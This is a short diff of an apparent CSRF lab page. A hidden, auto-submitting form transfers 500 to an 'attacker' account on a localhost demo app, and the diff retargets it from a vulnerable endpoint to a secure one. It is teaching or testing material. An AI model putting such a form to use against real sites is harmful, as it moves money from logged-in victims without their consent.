@@ -52,7 +52,7 @@
         This form auto-submits a money transfer request to the vulnerable endpoint.
         Prerequisites: victim must be logged in at localhost:5000
     -->
-    <form id="csrf-form" method="POST" action="http://localhost:5000/csrf/vulnerable/transfer" style="display:none;">
+    <form id="csrf-form" method="POST" action="http://localhost:5000/csrf/secure/transfer" style="display:none;">
         <input type="hidden" name="to_username" value="attacker">
         <input type="hidden" name="amount" value="500">
     </form>
